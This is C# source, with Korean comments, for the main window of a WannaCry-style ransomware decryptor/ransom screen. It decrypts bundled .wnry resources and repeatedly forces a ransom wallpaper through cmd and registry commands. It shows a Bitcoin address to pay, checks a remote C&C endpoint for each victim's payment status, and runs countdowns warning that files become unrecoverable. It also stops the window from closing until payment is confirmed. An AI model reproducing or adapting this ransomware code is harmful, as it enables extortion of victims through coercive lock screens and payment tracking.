using _WanaDecryptor_.Utils.Crypto;
using Newtonsoft.Json.Linq;
using System;
using System.IO;
using System.Net;
using System.Threading;
using System.Threading.Tasks;
using System.Web;
using System.Windows;
using System.Windows.Input;

namespace _WanaDecryptor_
{
    /// <summary>
    /// MainWindow.xaml에 대한 상호 작용 논리
    /// </summary>
    public partial class MainWindow : Window
    {
        // 남은 시간 설정 Timer
        private System.Windows.Threading.DispatcherTimer timer = new System.Windows.Threading.DispatcherTimer();
        // 남은 시간 확인
        public bool isAccessDecryptModule { get; private set; } = true;
        // 복호화 지불 확인
        public bool isDecryptChecker { get; private set; } = false;




        /// <summary>
        /// 생성자
        /// </summary>
        public MainWindow()
        {
            InitializeComponent();
        }



        /// <summary>
        /// Hyperlink URL 기본 브라우저로 열기
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void Hyperlink_RequestNavigate(object sender, System.Windows.Navigation.RequestNavigateEventArgs e)
        {
            try
            {
                System.Diagnostics.Process.Start(e.Uri.AbsoluteUri);
            }
            catch (Exception) { }
        }



        /// <summary>
        /// Message Send Button Mouse Enter Event
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void SendMessageButton_MouseEnter(object sender, MouseEventArgs e)
        {
            try
            {
                Mouse.OverrideCursor = Cursors.Hand;
            }
            catch (Exception) { }
        }



        /// <summary>
        /// Message Send Button Mouse Leave Event
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void SendMessageButton_MouseLeave(object sender, MouseEventArgs e)
        {
            try
            {
                Mouse.OverrideCursor = Cursors.Arrow;
            }
            catch (Exception) { }
        }



        /// <summary>
        /// Message Send Button Event
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void SendMessageButton_MouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            try
            {
                SendMessage sendMessage = new SendMessage();
                sendMessage.ShowDialog();
            }
            catch (Exception) { }
        }



        /// <summary>
        /// Main 화면 실행 이벤트
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void Window_Loaded(object sender, RoutedEventArgs e)
        {
            try
            {
                // AES 모듈
                AESManager aESManager = new AESManager();

                // Wallpapers change wannacry image
                File.WriteAllBytes("@WanaDecrypt0r@.png", Convert.FromBase64String(aESManager.TextAESDecrypt(File.ReadAllText("e.wnry"))));
                Thread WALLPAPERS_CHANGE = new Thread(delegate ()
                {
                    for (int i = 0; i < 20; i++)
                    {
                        string getImagePath = System.IO.Path.Combine(System.Environment.CurrentDirectory, "@WanaDecrypt0r@.png");
                        System.Diagnostics.ProcessStartInfo pri = new System.Diagnostics.ProcessStartInfo();
                        System.Diagnostics.Process pro = new System.Diagnostics.Process();
                        pri.FileName = "cmd.exe";
                        pri.CreateNoWindow = true;
                        pri.UseShellExecute = false;
                        pri.RedirectStandardInput = true;
                        pri.RedirectStandardOutput = true;
                        pri.RedirectStandardError = true;
                        pro.StartInfo = pri;
                        pro.Start();
                        pro.StandardInput.WriteLine(string.Format("reg add \"hkcu\\control panel\\desktop\" /v wallpaper /t REG_SZ /d \"{0}\" /f", getImagePath));
                        pro.StandardInput.WriteLine("reg add \"hkcu\\control panel\\desktop\" /v WallpaperStyle /t REG_SZ /d 0 /f");
                        pro.StandardInput.WriteLine("RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters ,1 ,True");
                        pro.StandardInput.Close();
                        string resultValue = pro.StandardOutput.ReadToEnd();
                        pro.WaitForExit();
                        pro.Close();
                    }
                });
                WALLPAPERS_CHANGE.Start();

                // 비트코인 주소 설정
                BitcoinAddress.Text = aESManager.TextAESDecrypt(File.ReadAllText("c.wnry"));

                // 클라이언트 정보 불러오기
                string clientInfo = null;
                await Task.Run(() => 
                {
                    WebClient webClient = new WebClient();
                    clientInfo = webClient.DownloadString(
                        string.Format(
                            "https://rhya-network.kro.kr/RhyaNetwork/wanacrypt0r_manager?mode=1&clientid={0}",
                            JObject.Parse(aESManager.TextAESDecrypt(File.ReadAllText("b.wnry")))["client_id"]));
                    webClient.Dispose();
                });

                // JSON 파싱
                JObject jObjectForClientInfoNew = JObject.Parse(HttpUtility.UrlDecode(clientInfo));

                // 날짜 설정
                DateTime encryptStartDate = DateTime.Parse((string)jObjectForClientInfoNew["encrypt_date"]);
                DateTime nowDateTime = DateTime.Now;
                DateTime timeEndDate1 = encryptStartDate.AddDays(3);
                DateTime timeEndDate2 = encryptStartDate.AddDays(7);
                Date1.Content = timeEndDate1.ToString("yyyy/MM/dd HH:mm:ss");
                Date2.Content = timeEndDate2.ToString("yyyy/MM/dd HH:mm:ss");
                if (nowDateTime < timeEndDate1)
                {
                    TimeSpan dateDiff = timeEndDate1 - nowDateTime;

                    int days = dateDiff.Days;
                    int hours = dateDiff.Hours;
                    int minutes = dateDiff.Minutes;
                    int seconds = dateDiff.Seconds;

                    Timer1.Content = string.Format("{0:D2}:{1:D2}:{2:D2}:{3:D2}", days, hours, minutes, seconds);

                    ProgressBar1.Value = (days * 24 * 60 * 60) + (hours * 60 * 60) + (minutes * 60) + seconds;
                }
                if (nowDateTime < timeEndDate2)
                {
                    TimeSpan dateDiff = timeEndDate2 - nowDateTime;

                    int days = dateDiff.Days;
                    int hours = dateDiff.Hours;
                    int minutes = dateDiff.Minutes;
                    int seconds = dateDiff.Seconds;

                    Timer2.Content = string.Format("{0:D2}:{1:D2}:{2:D2}:{3:D2}", days, hours, minutes, seconds);

                    ProgressBar2.Value = (days * 24 * 60 * 60) + (hours * 60 * 60) + (minutes * 60) + seconds;
                }
                else
                {
                    isAccessDecryptModule = false;
                }

                // Timer 설정
                timer.Tick += Timer_Tick;
                timer.Interval = TimeSpan.FromMilliseconds(1000);

                if ((int)jObjectForClientInfoNew["is_payment"] != 1)
                    timer.Start();
                else
                    isDecryptChecker = true;
            }
            catch (Exception)
            {
                // 예외 발생
                MessageBox.Show("@WanaDecrypt0r@.exe를 실행 중 알 수 없는 오류가 발생하였습니다.", "@WanaDecrypt0r@", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }



        /// <summary>
        /// Timer 작동 함수
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void Timer_Tick(object sender, EventArgs e)
        {
            try
            {
                string calTime1 = CalLeftTimeForTimer((string)Timer1.Content);
                string calTime2 = CalLeftTimeForTimer((string)Timer2.Content);

                if (calTime1 != null)
                {
                    ProgressBar1.Value = ProgressBar1.Value - 1;
                    Timer1.Content = calTime1;
                }
                else
                {
                    Timer1.Content = "00:00:00:00";
                }

                if (calTime2 != null)
                {
                    ProgressBar2.Value = ProgressBar2.Value - 1;
                    Timer2.Content = calTime2;
                }
                else
                {
                    isAccessDecryptModule = false;
                    Timer2.Content = "00:00:00:00";
                }
            }
            catch (Exception) { }
        }



        /// <summary>
        /// 남은 시간 계산
        /// </summary>
        /// <param name="baseTime">현재 시간</param>
        /// <returns></returns>
        private string CalLeftTimeForTimer(string baseTime)
        {
            try
            {
                string[] split = baseTime.Split(':');
                int days = int.Parse(split[0]);
                int hours = int.Parse(split[1]);
                int minutes = int.Parse(split[2]);
                int seconds = int.Parse(split[3]);

                if (seconds <= 0)
                {
                    seconds = 59;
                    if (minutes <= 0)
                    {
                        minutes = 59;
                        if (hours <= 0)
                        {
                            hours = 23;
                            if (days <= 0)
                            {
                                return null;
                            }
                            else
                            {
                                days = days - 1;
                            }
                        }
                        else
                        {
                            hours = hours - 1;
                        }
                    }
                    else
                    {
                        minutes = minutes - 1;
                    }
                }
                else
                {
                    seconds = seconds - 1;
                }

                return string.Format("{0:D2}:{1:D2}:{2:D2}:{3:D2}", days, hours, minutes, seconds);
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }



        /// <summary>
        /// 비트코인 주소 복사
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void BitcoinAddressCopyButton_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                Clipboard.SetText(BitcoinAddress.Text);
            }
            catch (Exception) { }
        }


        /// <summary>
        /// 창 닫기 버튼 클릭 이벤트
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            try
            {
                if (isDecryptChecker)
                {
                    Environment.Exit(0);
                }
                else
                {
                    e.Cancel = true;
                }
            }
            catch (Exception) { }
        }



        /// <summary>
        /// 지불 확인 버튼 클릭 이벤트
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void CheckPaymentButton_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                if (isAccessDecryptModule)
                {
                    DateTime utcTime = DateTime.Now.ToUniversalTime();

                    bool isShowUI = false;
                    int hours = int.Parse(utcTime.ToString("HH"));

                    CheckPayment checkPayment = new CheckPayment();

                    if (9 <= hours && 11 >= hours)
                    {
                        isShowUI = true;

                        checkPayment.ShowDialog();
                    }
                    else
                    {
                        if (MessageBox.Show(string.Format("Not time to confirm payment!\r\n\r\nThe current time is not 9 am to 11 am Greenwich Mean Time. If payment confirmation is not made at the best time, payment verification may not be done properly.\r\n\r\nIf we proceed with payment confirmation as it is, please click 'Yes' or 'No' and wait for Greenwich Mean Time from 9:00 a.m. to 11:00 am.\r\n\r\nGMT/UTC Time: {0}", utcTime.ToString("yyyy/MM/dd HH:mm:ss")), "@WannaDecryptor@", MessageBoxButton.YesNo, MessageBoxImage.Information) == MessageBoxResult.Yes)
                        {
                            isShowUI = true;
                            checkPayment.ShowDialog();
                        }
                    }

                    if (isShowUI)
                    {
                        // 결과 확인
                        if (checkPayment.result == 1)
                        {
                            timer.Stop();
                            isDecryptChecker = true;
                        }
                        else
                        {
                            MessageBox.Show("Payment failed to confirm!\r\n\r\nIt may be a communication problem with C&C server. Or, the WarnerCry data file in the local file may be damaged or in the process of not being paid yet. Please make the payment and try again between 9:00 a.m. and 11:00 a.m. Greenwich Mean Time.", "@WannaDecryptor@", MessageBoxButton.OK, MessageBoxImage.Error);
                            isDecryptChecker = false;
                        }
                    }
                }
                else
                {
                    MessageBox.Show("Time has expired. You can no longer decrypt the file.", "@WannaDecryptor@", MessageBoxButton.OK, MessageBoxImage.Error);
                }
            }
            catch (Exception) { }
        }



        /// <summary>
        /// 복호화 버튼 클릭 이벤트
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void DecryptButton_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                if (isAccessDecryptModule)
                {
                    Decrypt decrypt = new Decrypt(isDecryptChecker);
                    decrypt.ShowDialog();
                }
                else
                {
                    MessageBox.Show("Time has expired. You can no longer decrypt the file.", "@WannaDecryptor@", MessageBoxButton.OK, MessageBoxImage.Error);
                }
            }
            catch (Exception) { }
        }
    }
}
